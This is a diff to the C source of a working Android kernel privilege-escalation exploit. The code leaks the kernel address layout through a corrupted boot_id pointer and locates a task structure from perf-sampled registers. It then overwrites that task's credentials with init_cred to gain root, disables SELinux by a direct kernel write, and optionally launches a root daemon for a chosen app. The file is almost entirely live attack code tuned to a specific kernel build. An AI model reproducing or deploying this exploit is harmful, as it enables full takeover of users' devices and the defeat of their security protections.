@@ -1,5 +1,7 @@
 #include "common.h"
 
+#include <linux/perf_event.h>
+
 /* Minimal songyuan proof.  No ashmem/configfs/SystemUI stages are linked. */
 uint32_t f_wait;
 uint32_t f_pi_target;
@@ -31,20 +33,16 @@ uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret;
 
 #define EXP_BUF_NWORDS 16
-#define CONTROL_COMM "gl-root-proof"
 #define KASLR_SLIDE_MAX 0x3f00000000ULL
 #define PAGE_WORKER_SPARES 4
-#define REDIRECT_RETRY_SPARES 2
+#define CRED_ATTEMPTS 2
 
-static atomic_int control_ready;
-static atomic_int control_check;
-static atomic_int control_done;
 static atomic_int control_uid;
 static atomic_int control_gid;
-static int proof_pipe[2] = {-1, -1};
 static int control_ready_pipe[2] = {-1, -1};
 static char original_boot_id[64];
 static uint64_t original_boot_id_words[2];
+static int boot_id_needs_restore;
 static uintptr_t selinux_bool_word;
 static size_t active_page_worker = SIZE_MAX;
 static size_t write_page_count;
@@ -53,7 +51,10 @@ static size_t redirect_page_count;
 static size_t redirect_page_next;
 
 struct leader_proof_shared {
-  atomic_int go;
+  atomic_int task_ready;
+  atomic_uintptr_t task;
+  atomic_int check_seq;
+  atomic_int checked_seq;
   atomic_int done;
   atomic_int finish;
   atomic_int uid;
@@ -62,9 +63,6 @@ struct leader_proof_shared {
   atomic_int daemon_pid;
   atomic_int daemon_result;
   atomic_int daemon_errno;
-  atomic_int enforcing_before;
-  atomic_int enforcing_after;
-  atomic_int setenforce_errno;
   atomic_int ashmem_alias_ready;
   atomic_int ashmem_alias_errno;
   atomic_int app_uid;
@@ -93,15 +91,6 @@ enum {
 
 static int kernel_ptr(uint64_t value) {
   return (value >> 48) == 0xffff;
-}
-
-static int task_list_ptr(uint64_t value) {
-  if (value < DIRECT_MAP_BASE + TASK_TASKS_OFF || value >= DIRECT_MAP_END)
-    return 0;
-  /* task_struct instances on this target are at least 64-byte aligned.  A
-   * stale boot_id.data value points into the randomized kernel image, while
-   * a successful task-tail redirect must resolve to the linear/direct map. */
-  return ((value - TASK_TASKS_OFF) & 0x3fULL) == 0;
 }
 
 static void abort_control_child(pid_t pid) {
@@ -416,13 +405,10 @@ static int restore_boot_id_pointer_once(void) {
 }
 
 static int restore_boot_id_pointer(void) {
-  for (int attempt = 1; attempt <= 2; ++attempt) {
-    if (restore_boot_id_pointer_once())
-      return 1;
-    if (attempt < 2)
-      pr_warning("songyuan boot_id restore retry attempt=%d/2\n", attempt + 1);
-  }
-  return 0;
+  /* Never re-fire a state-changing PI primitive after ambiguous readback.
+   * A worker exit only proves that the route completed; it does not prove
+   * where the rb-tree store landed. */
+  return restore_boot_id_pointer_once();
 }
 
 static int accept_kaslr_words(const uint64_t words[2], const char *source) {
@@ -440,37 +426,13 @@ static int accept_kaslr_words(const uint64_t words[2], const char *source) {
   kaslr_base = KIMAGE_TEXT_BASE + slide;
   kaslr_done = 1;
   slide_p0_offset = slide;
+  boot_id_needs_restore = 1;
   pr_success("songyuan-kaslr-ok source=%s leaked=%016llx base=%016llx "
              "slide=%016llx\n",
              source, (unsigned long long)words[0],
              (unsigned long long)kaslr_base,
              (unsigned long long)kaslr_slide);
   return 1;
-}
-
-static void *control_thread(void *unused __attribute__((unused))) {
-  (void)prctl(PR_SET_NAME, CONTROL_COMM, 0, 0, 0);
-  atomic_store(&control_ready, 1);
-  while (!atomic_load(&control_check))
-    __asm__ volatile("yield" ::: "memory");
-
-  uid_t uid = getuid();
-  gid_t gid = getgid();
-  atomic_store(&control_uid, (int)uid);
-  atomic_store(&control_gid, (int)gid);
-
-  if (uid == 0) {
-    pid_t child = fork();
-    if (child == 0) {
-      dup2(proof_pipe[1], STDOUT_FILENO);
-      dup2(proof_pipe[1], STDERR_FILENO);
-      execl("/system/bin/id", "id", (char *)NULL);
-      _exit(127);
-    }
-  }
-  atomic_store(&control_done, 1);
-  for (;;)
-    pause();
 }
 
 static int leak_kaslr(void) {
@@ -507,40 +469,148 @@ static int leak_kaslr(void) {
   /* The primary erase also stores bootid_data at logger_slot+8.  That
    * adjacent slot is zero in the exact image; use the parentless secondary
    * erase to restore it before this transaction returns. */
-  for (int attempt = 1; attempt <= 2; ++attempt) {
-    int write_ok = kernel_write64_once_shape(bootid_data, logger_slot,
-                                             "kaslr", 2);
-
-    memset(words, 0, sizeof(words));
-    if (!read_bootid_words(words)) {
-      pr_error("songyuan kaslr read invalid attempt=%d write_ok=%d "
-               "first=%016llx second=%016llx\n", attempt, write_ok,
-               (unsigned long long)words[0], (unsigned long long)words[1]);
-    } else if (accept_kaslr_words(
-                   words, write_ok ? "write" : "write-side-effect")) {
-      return 1;
-    } else {
-      pr_error("songyuan kaslr stage produced no valid pointer attempt=%d "
-               "write_ok=%d words=%016llx/%016llx\n",
-               attempt, write_ok, (unsigned long long)words[0],
-               (unsigned long long)words[1]);
-    }
-    if (attempt < 2)
-      pr_warning("songyuan kaslr retry attempt=%d/2\n", attempt + 1);
+  int write_ok = kernel_write64_once_shape(bootid_data, logger_slot,
+                                           "kaslr", 2);
+  memset(words, 0, sizeof(words));
+  if (!read_bootid_words(words)) {
+    pr_error("songyuan kaslr read invalid write_ok=%d first=%016llx "
+             "second=%016llx\n", write_ok,
+             (unsigned long long)words[0], (unsigned long long)words[1]);
+  } else if (accept_kaslr_words(
+                 words, write_ok ? "write" : "write-side-effect")) {
+    return 1;
+  } else {
+    pr_error("songyuan kaslr stage produced no valid pointer write_ok=%d "
+             "words=%016llx/%016llx; refusing retry\n",
+             write_ok, (unsigned long long)words[0],
+             (unsigned long long)words[1]);
   }
   return 0;
 }
 
+static uintptr_t perf_find_current_task(void) {
+  struct perf_event_attr pe;
+  memset(&pe, 0, sizeof(pe));
+  pe.type = PERF_TYPE_SOFTWARE;
+  pe.size = sizeof(pe);
+  pe.config = PERF_COUNT_SW_CPU_CLOCK;
+  pe.sample_period = 5000;
+  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+  pe.sample_regs_intr = (1ULL << 32) - 1;
+  pe.disabled = 1;
+  pe.exclude_user = 1;
+  pe.exclude_hv = 1;
+  pe.exclude_idle = 1;
+
+  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+  if (fd < 0) {
+    pr_warning("songyuan perf_event_open errno=%d\n", errno);
+    return 0;
+  }
+  const size_t page_size = 4096;
+  const size_t data_size = page_size * 32;
+  const size_t map_size = page_size + data_size;
+  void *mapping = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
+                       MAP_SHARED, fd, 0);
+  if (mapping == MAP_FAILED) {
+    pr_warning("songyuan perf mmap errno=%d\n", errno);
+    close(fd);
+    return 0;
+  }
+  (void)ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+  for (int i = 0; i < 500000; ++i)
+    (void)syscall(__NR_getpid);
+  (void)ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+
+  struct perf_event_mmap_page *header = mapping;
+  uint64_t head = header->data_head;
+  atomic_thread_fence(memory_order_acquire);
+  unsigned char *base = (unsigned char *)mapping + page_size;
+  uint64_t pos = header->data_tail;
+  uintptr_t candidates[256];
+  int candidate_count = 0;
+  while (pos < head && candidate_count < 256) {
+    size_t ring_off = (size_t)(pos % data_size);
+    if (ring_off + sizeof(struct perf_event_header) > data_size)
+      break;
+    struct perf_event_header *event =
+        (struct perf_event_header *)(base + ring_off);
+    if (event->size < sizeof(*event) || ring_off + event->size > data_size)
+      break;
+    if (event->type == PERF_RECORD_SAMPLE) {
+      unsigned char *cursor = (unsigned char *)event + sizeof(*event) + 8;
+      unsigned char *end = (unsigned char *)event + event->size;
+      if (cursor + 8 + 32 * sizeof(uint64_t) <= end) {
+        uint64_t abi;
+        memcpy(&abi, cursor, sizeof(abi));
+        cursor += 8;
+        if (abi == PERF_SAMPLE_REGS_ABI_32 ||
+            abi == PERF_SAMPLE_REGS_ABI_64) {
+          for (int reg = 0; reg < 32 && candidate_count < 256; ++reg) {
+            uint64_t value;
+            memcpy(&value, cursor + reg * sizeof(value), sizeof(value));
+            value |= 0x0fULL << 56;
+            if (value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END)
+              candidates[candidate_count++] = (uintptr_t)value;
+          }
+        }
+      }
+    }
+    pos += event->size;
+  }
+  header->data_tail = head;
+  munmap(mapping, map_size);
+  close(fd);
+
+  uintptr_t best = 0;
+  int best_votes = 0;
+  for (int i = 0; i < candidate_count; ++i) {
+    int votes = 0;
+    for (int j = 0; j < candidate_count; ++j)
+      votes += candidates[i] == candidates[j];
+    if (votes > best_votes) {
+      best = candidates[i];
+      best_votes = votes;
+    }
+  }
+  pr_info("songyuan perf task=%016zx votes=%d/%d\n",
+          best, best_votes, candidate_count);
+  return best_votes >= 2 ? best : 0;
+}
+
+static int valid_task_ptr(uintptr_t task) {
+  return task >= DIRECT_MAP_BASE && task < DIRECT_MAP_END &&
+         (task & 0x3fU) == 0;
+}
+
 static int root_control_thread(void) {
-  /* init_task.tasks links process leaders.  Create a dedicated leader only
-   * after page preparation, keep it alive, and make it identify/check itself
-   * after the parent changes that exact task. */
+  /* The old task-tail redirect was the panic source.  Restore boot_id first,
+   * disable SELinux with one verified write, then use the kernel's perf sample
+   * registers to identify a dedicated victim task without changing any list. */
+  if (boot_id_needs_restore && !restore_boot_id_pointer())
+    return 0;
+  boot_id_needs_restore = 0;
+
+  if (read_enforcing_state() != 0) {
+    if (!prepare_redirect_pages(1))
+      return 0;
+    uintptr_t enforcing = (uintptr_t)(kaslr_base + SELINUX_ENFORCING_OFF);
+    if (!kernel_write64_once_shape(enforcing, 0, "selinux-disable", 2))
+      return 0;
+    int state = read_enforcing_state();
+    pr_success("songyuan-selinux-write target=%016zx value=%016zx state=%d\n",
+               enforcing, selinux_bool_word, state);
+    if (state != 0)
+      return 0;
+  }
+
   struct leader_proof_shared *shared = mmap(
       NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
   if (shared == MAP_FAILED || pipe(control_ready_pipe) != 0)
     return 0;
   memset(shared, 0, sizeof(*shared));
+
   int daemon_mode = getenv("TICKERBAR_DAEMON") != NULL;
   if (daemon_mode) {
     const char *uid_env = getenv("TICKERBAR_ALLOWED_UID");
@@ -554,71 +624,53 @@ static int root_control_thread(void) {
     }
     atomic_store(&shared->app_uid, (int)uid_value);
   }
-  uintptr_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA;
-  uintptr_t init_task = (uintptr_t)(kaslr_base + INIT_TASK_OFF);
-  uintptr_t init_tasks_prev = init_task + TASK_TASKS_OFF + 8;
-  /* The primary erase's collateral lands at init_task.pushable_tasks
-   * (__rb_parent_color).  The second parentless erase restores that word to
-   * its required zero value in the same sched_setattr transaction. */
-  if (!kernel_write64_once_shape(bootid_data, init_tasks_prev,
-                                 "task-tail", 2)) {
-    (void)restore_boot_id_pointer();
-    return 0;
-  }
 
-  /* boot_id.data now follows init_task.tasks.prev dynamically.  Fork the
-   * dedicated leader only after that write has completed, then sample the
-   * tail immediately; this avoids the page-search window in which unrelated
-   * system workers could otherwise become the newest process. */
   pid_t control_pid = fork();
-  if (control_pid < 0) {
-    (void)restore_boot_id_pointer();
+  if (control_pid < 0)
     return 0;
-  }
   if (control_pid == 0) {
     close(control_ready_pipe[0]);
     (void)prctl(PR_SET_PDEATHSIG, SIGKILL);
     if (getppid() == 1)
       _exit(1);
     (void)prctl(PR_SET_NAME, "glproof", 0, 0, 0);
-    /* The exploit parent is pinned to CPU 0 for timing-sensitive work.  The
-     * proof leader does no timing-sensitive work, so let Android place it on
-     * any CPU and sleep while the parent prepares the remaining pages.  ARM's
-     * `yield` instruction is only a processor hint; using it here previously
-     * burned one full CPU for several minutes and starved system_server. */
     reset_cpu_pin();
-    char token = 'R';
+
+    uintptr_t first = perf_find_current_task();
+    uintptr_t second = first ? perf_find_current_task() : 0;
+    uintptr_t task = first == second && valid_task_ptr(first) ? first : 0;
+    atomic_store(&shared->task, task);
+    atomic_store(&shared->task_ready, 1);
+    char token = task ? 'R' : 'F';
     (void)write(control_ready_pipe[1], &token, 1);
-    while (!atomic_load(&shared->go))
-      usleep(1000);
-    uid_t uid = (uid_t)syscall(SYS_getuid);
-    gid_t gid = (gid_t)syscall(SYS_getgid);
-    atomic_store(&shared->uid, (int)uid);
-    atomic_store(&shared->gid, (int)gid);
-    if (daemon_mode && uid == 0 && gid == 0) {
-      atomic_store(&shared->enforcing_before, read_enforcing_state());
-      int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
-      int setenforce_errno = 0;
-      if (enforce_fd < 0) {
-        setenforce_errno = errno;
-      } else {
-        if (write(enforce_fd, "0", 1) != 1)
-          setenforce_errno = errno ? errno : EIO;
-        close(enforce_fd);
+
+    int seen = 0;
+    uid_t uid = (uid_t)-1;
+    gid_t gid = (gid_t)-1;
+    while (!atomic_load(&shared->finish)) {
+      int seq = atomic_load(&shared->check_seq);
+      if (!seq || seq == seen) {
+        usleep(1000);
+        continue;
       }
-      atomic_store(&shared->setenforce_errno, setenforce_errno);
-      atomic_store(&shared->enforcing_after, read_enforcing_state());
-      errno = 0;
-      int ashmem_alias_ready = ensure_ashmem_boot_alias();
-      atomic_store(&shared->ashmem_alias_ready, ashmem_alias_ready);
-      atomic_store(&shared->ashmem_alias_errno,
-                   ashmem_alias_ready ? 0 : errno);
-      if (!ashmem_alias_ready) {
-        atomic_store(&shared->done, 1);
-        while (!atomic_load(&shared->finish))
-          usleep(1000);
-        _exit(1);
-      }
+      seen = seq;
+      uid = (uid_t)syscall(SYS_getuid);
+      gid = (gid_t)syscall(SYS_getgid);
+      atomic_store(&shared->uid, (int)uid);
+      atomic_store(&shared->gid, (int)gid);
+      atomic_store(&shared->checked_seq, seq);
+      if (uid == 0 && gid == 0)
+        break;
+    }
+    if (uid != 0 || gid != 0)
+      _exit(1);
+
+    errno = 0;
+    int ashmem_alias_ready = ensure_ashmem_boot_alias();
+    atomic_store(&shared->ashmem_alias_ready, ashmem_alias_ready);
+    atomic_store(&shared->ashmem_alias_errno,
+                 ashmem_alias_ready ? 0 : errno);
+    if (daemon_mode && ashmem_alias_ready) {
       pid_t daemon_pid = fork();
       if (daemon_pid == 0) {
         (void)setsid();
@@ -647,129 +699,77 @@ static int root_control_thread(void) {
         usleep(10000);
       }
     }
+    (void)prctl(PR_SET_PDEATHSIG, 0);
     atomic_store(&shared->done, 1);
-    while (!atomic_load(&shared->finish))
-      usleep(1000);
-    _exit(uid == 0 ? 0 : 1);
+    for (;;)
+      pause();
   }
+
   close(control_ready_pipe[1]);
-  char ready;
-  if (read(control_ready_pipe[0], &ready, 1) != 1) {
+  char ready = 0;
+  if (read(control_ready_pipe[0], &ready, 1) != 1 || ready != 'R') {
+    pr_error("songyuan perf task discovery failed\n");
     abort_control_child(control_pid);
-    (void)restore_boot_id_pointer();
     return 0;
   }
+  uintptr_t task = atomic_load(&shared->task);
+  if (!atomic_load(&shared->task_ready) || !valid_task_ptr(task)) {
+    abort_control_child(control_pid);
+    return 0;
+  }
+  pr_success("songyuan-task-perf task=%016zx pid=%d\n", task, control_pid);
 
-  uint64_t list[2] = {0, 0};
-  if (!read_bootid_words(list) || !task_list_ptr(list[0])) {
-    pr_error("songyuan task-tail rejected prev=%016llx adjacent=%016llx "
-             "expected-direct-map=%016llx..%016llx\n",
-             (unsigned long long)list[0], (unsigned long long)list[1],
-             (unsigned long long)DIRECT_MAP_BASE,
-             (unsigned long long)DIRECT_MAP_END);
-    abort_control_child(control_pid);
-    (void)restore_boot_id_pointer();
-    return 0;
-  }
-  uintptr_t task = (uintptr_t)list[0] - TASK_TASKS_OFF;
-  pr_success("songyuan-task-tail prev=%016llx adjacent=%016llx task=%016zx\n",
-             (unsigned long long)list[0], (unsigned long long)list[1], task);
+  /* Match upstream's bounded W2 arm: point task->cred at init_cred's stable
+   * direct-map alias and use the right-child erase.  The former left-child
+   * arm made init_cred itself the synthetic rb parent; on this 6.12 build the
+   * consumer never returned from that traversal. */
+  uintptr_t init_cred = (uintptr_t)P0_DATA_ALIAS_CONST(INIT_CRED);
+  int rooted = 0;
+  for (int attempt = 1; attempt <= CRED_ATTEMPTS && !rooted; ++attempt) {
+    if (!prepare_redirect_pages(1))
+      break;
+    char stage[32];
+    snprintf(stage, sizeof(stage), "cred-switch-%d", attempt);
+    if (!kernel_write64_once_shape(task + TASK_CRED_OFF, init_cred,
+                                   stage, 1))
+      break;
 
-  /* Confirm that init_task.tasks.prev resolved to this executable's process
-   * leader.  The left-child primitive's collateral store changes comm[8..15],
-   * so only validate the untouched first eight bytes. */
-  if (!kernel_write64_once(bootid_data, task + TASK_COMM_OFF, "task-comm")) {
-    abort_control_child(control_pid);
-    (void)restore_boot_id_pointer();
-    return 0;
-  }
-  uint64_t comm_words[2];
-  if (!read_bootid_words(comm_words)) {
-    abort_control_child(control_pid);
-    (void)restore_boot_id_pointer();
-    return 0;
-  }
-  char comm_prefix[9];
-  memcpy(comm_prefix, comm_words, 8);
-  comm_prefix[8] = '\0';
-  pr_success("songyuan-task-identity task=%016zx comm-prefix=%s raw=%016llx\n",
-             task, comm_prefix, (unsigned long long)comm_words[0]);
-  if (memcmp(comm_prefix, "glproof", 7) != 0) {
-    pr_error("songyuan task identity mismatch; refusing cred write\n");
-    (void)restore_boot_id_pointer();
-    atomic_store(&shared->go, 1);
-    while (!atomic_load(&shared->done))
+    atomic_store(&shared->check_seq, attempt);
+    for (int i = 0; i < 10000 &&
+                        atomic_load(&shared->checked_seq) != attempt; ++i)
       usleep(1000);
-    atomic_store(&shared->finish, 1);
-    while (waitpid(control_pid, NULL, 0) < 0 && errno == EINTR) {}
-    return 0;
+    rooted = atomic_load(&shared->checked_seq) == attempt &&
+             atomic_load(&shared->uid) == 0 &&
+             atomic_load(&shared->gid) == 0;
+    pr_info("songyuan cred verify attempt=%d rooted=%d uid=%d gid=%d\n",
+            attempt, rooted, atomic_load(&shared->uid),
+            atomic_load(&shared->gid));
   }
 
-  /* Android derives ashmem names from boot_id.  Restore and verify the exact
-   * UUID before the credential writes or any other potentially long work. */
-  if (!restore_boot_id_pointer()) {
+  if (!rooted) {
+    atomic_store(&shared->finish, 1);
     abort_control_child(control_pid);
     return 0;
   }
-
-  /* The remaining independently pinned pages perform the proven left-child
-   * cred switch and repair its init_cred collateral.  The rooted child
-   * changes enforcement through selinuxfs, which updates SELinux coherently. */
-  uintptr_t init_cred = (uintptr_t)(kaslr_base + INIT_CRED_OFF);
-  int cred_first = kernel_write64_once_shape(
-      task + TASK_CRED_OFF, init_cred, "cred-switch-1", 0);
-  int cred_second = kernel_write64_once_shape(
-      task + TASK_CRED_OFF, init_cred, "cred-switch-2", 0);
-  if (!cred_first && !cred_second)
-    return 0;
-
-  if (!kernel_write64_once_shape(init_cred + 8, 0,
-                                 "cred-collateral-restore", 1))
-    return 0;
-
-  if (daemon_mode) {
-    uintptr_t enforcing = (uintptr_t)(kaslr_base + SELINUX_ENFORCING_OFF);
-    if (!kernel_write64_once_shape(enforcing, 0,
-                                   "selinux-disable", 2))
-      return 0;
-    int enforcing_after_write = read_enforcing_state();
-    pr_success("songyuan-selinux-write target=%016zx value=%016zx state=%d\n",
-               enforcing, selinux_bool_word, enforcing_after_write);
-    if (enforcing_after_write != 0)
-      return 0;
-  }
-
-  atomic_store(&shared->go, 1);
-  for (int i = 0; i < 100000 && !atomic_load(&shared->done); i++)
+  for (int i = 0; i < 100000 && !atomic_load(&shared->done); ++i)
     usleep(100);
-  int proof_uid = atomic_load(&shared->uid);
-  int proof_gid = atomic_load(&shared->gid);
+
   int proof_done = atomic_load(&shared->done);
   int daemon_started = atomic_load(&shared->daemon_started);
-  int daemon_pid = atomic_load(&shared->daemon_pid);
-  int daemon_result = atomic_load(&shared->daemon_result);
-  int daemon_errno = atomic_load(&shared->daemon_errno);
-  int enforcing_before = atomic_load(&shared->enforcing_before);
-  int enforcing_after = atomic_load(&shared->enforcing_after);
-  int setenforce_errno = atomic_load(&shared->setenforce_errno);
   int ashmem_alias_ready = atomic_load(&shared->ashmem_alias_ready);
-  int ashmem_alias_errno = atomic_load(&shared->ashmem_alias_errno);
-  atomic_store(&shared->finish, 1);
-  int status = 0;
-  while (waitpid(control_pid, &status, 0) < 0 && errno == EINTR) {}
-  int rooted = proof_done && proof_uid == 0 && WIFEXITED(status) &&
-               WEXITSTATUS(status) == 0 &&
-               (!daemon_mode || (ashmem_alias_ready && daemon_started));
-  atomic_store(&control_uid, proof_uid);
-  atomic_store(&control_gid, proof_gid);
-  pr_success("songyuan-root-proof rooted=%d uid=%d gid=%d status=%d "
+  int success = proof_done && ashmem_alias_ready &&
+                (!daemon_mode || daemon_started);
+  atomic_store(&control_uid, atomic_load(&shared->uid));
+  atomic_store(&control_gid, atomic_load(&shared->gid));
+  pr_success("songyuan-root-proof rooted=%d uid=%d gid=%d victim=%d "
              "daemon=%d daemon_pid=%d daemon_result=%d daemon_errno=%d "
-             "enforce=%d->%d setenforce_errno=%d ashmem_alias=%d "
-             "ashmem_alias_errno=%d\n",
-             rooted, proof_uid, proof_gid, status, daemon_started, daemon_pid,
-             daemon_result, daemon_errno, enforcing_before, enforcing_after,
-             setenforce_errno, ashmem_alias_ready, ashmem_alias_errno);
-  return rooted;
+             "ashmem_alias=%d ashmem_alias_errno=%d\n",
+             success, atomic_load(&shared->uid), atomic_load(&shared->gid),
+             control_pid, daemon_started, atomic_load(&shared->daemon_pid),
+             atomic_load(&shared->daemon_result),
+             atomic_load(&shared->daemon_errno), ashmem_alias_ready,
+             atomic_load(&shared->ashmem_alias_errno));
+  return success;
 }
 
 int run_exploit(int argc, char **argv) {
@@ -804,12 +804,11 @@ int run_exploit(int argc, char **argv) {
 
   int slide_only = getenv("SLIDE_ONLY") != NULL;
   int repair_only = getenv("REPAIR_INIT_CRED") != NULL;
-  int daemon_requested = getenv("TICKERBAR_DAEMON") != NULL;
   const char *provided_slide = getenv("SONGYUAN_KASLR_SLIDE");
   int needs_slide_write = !provided_slide || !*provided_slide;
-  size_t stage_count = (slide_only ? 1 : repair_only ? 2 :
-                        5 + (daemon_requested ? 1 : 0)) +
-                       (size_t)needs_slide_write + REDIRECT_RETRY_SPARES;
+  size_t stage_count = slide_only ? (needs_slide_write ? 2 : 1) :
+      repair_only ? (needs_slide_write ? 3 : 1) :
+      (needs_slide_write ? 5 : 3);
 
   /* Fork every native stage while this process still has a pristine file
    * table.  After the first kernel writes, starting another child can make
@@ -873,12 +872,8 @@ int run_exploit(int argc, char **argv) {
    * while boot_id is canonical.  Once restore_boot_id_pointer() completes,
    * credential and SELinux pages are prepared just in time by the preforked
    * helpers, eliminating the long stale-page window from the last panic. */
-  size_t redirect_count = slide_only
-      ? 2 + 2 * (size_t)needs_slide_write
-      : repair_only
-          ? 2 + 2 * (size_t)needs_slide_write
-          : 4 + 2 * (size_t)needs_slide_write;
-  if (!prepare_redirect_pages(redirect_count)) {
+  size_t redirect_count = needs_slide_write ? 2 : 0;
+  if (redirect_count && !prepare_redirect_pages(redirect_count)) {
     pr_error("songyuan redirect-page preparation failed count=%zu\n",
              redirect_count);
     return 1;
@@ -888,15 +883,21 @@ int run_exploit(int argc, char **argv) {
     return 1;
   if (repair_only) {
     uintptr_t init_cred = (uintptr_t)(kaslr_base + INIT_CRED_OFF);
-    int restored = restore_boot_id_pointer();
+    int restored = !boot_id_needs_restore || restore_boot_id_pointer();
+    boot_id_needs_restore = 0;
+    if (restored && !prepare_redirect_pages(1))
+      restored = 0;
     int repaired = restored && kernel_write64_once_shape(
         init_cred + 8, 0, "repair-init-cred-uidgid", 1);
     pr_success("songyuan-init-cred-repair repaired=%d target=%016zx\n",
                repaired, init_cred + 8);
     return repaired ? 0 : 1;
   }
-  if (slide_only)
-    return restore_boot_id_pointer() ? 0 : 1;
+  if (slide_only) {
+    int restored = !boot_id_needs_restore || restore_boot_id_pointer();
+    boot_id_needs_restore = 0;
+    return restored ? 0 : 1;
+  }
 
   int rooted = root_control_thread();
   alarm(0);
